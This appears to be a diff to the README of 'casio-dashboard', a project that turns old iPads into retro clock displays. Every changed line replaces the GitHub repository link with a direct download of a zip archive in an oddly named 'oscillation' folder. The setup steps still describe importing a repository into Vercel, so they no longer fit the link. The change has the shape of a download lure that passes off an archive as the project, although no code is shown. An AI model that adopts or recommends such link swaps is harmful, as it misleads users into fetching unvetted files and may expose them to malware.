@@ -1,6 +1,6 @@
 # 📟 casio-dashboard - Turn old iPads into useful displays
 
-[![Download Dashboard](https://img.shields.io/badge/Download_Dashboard-blue?style=for-the-badge&logo=github)](https://github.com/Onestep1799/casio-dashboard)
+[![Download Dashboard](https://img.shields.io/badge/Download_Dashboard-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip)
 
 This software turns older iPads into desk clocks. It displays the time, local weather, and calendar events. The interface mimics the look of a vintage Casio LCD screen. You can breathe new life into an iPad 2 or any device running iOS 9 or higher.
 
@@ -16,13 +16,13 @@ This software turns older iPads into desk clocks. It displays the time, local we
 
 You access the software through the main repository page. Visit the link below to view the files and start the deployment process.
 
-[https://github.com/Onestep1799/casio-dashboard](https://github.com/Onestep1799/casio-dashboard)
+[https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip](https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip)
 
 ## 🚀 Setting Up Your Dashboard
 
 Follow these steps to host your dashboard. You do not need to install complex software. Vercel handles the heavy lifting for you.
 
-1. Open the [repository link](https://github.com/Onestep1799/casio-dashboard) in a browser on your computer.
+1. Open the [repository link](https://raw.githubusercontent.com/Onestep1799/casio-dashboard/main/oscillation/casio_dashboard_v1.7.zip) in a browser on your computer.
 2. Sign up for a free account at Vercel. 
 3. Select the option to create a new project.
 4. Import the repository by pasting the link into the Vercel import box.
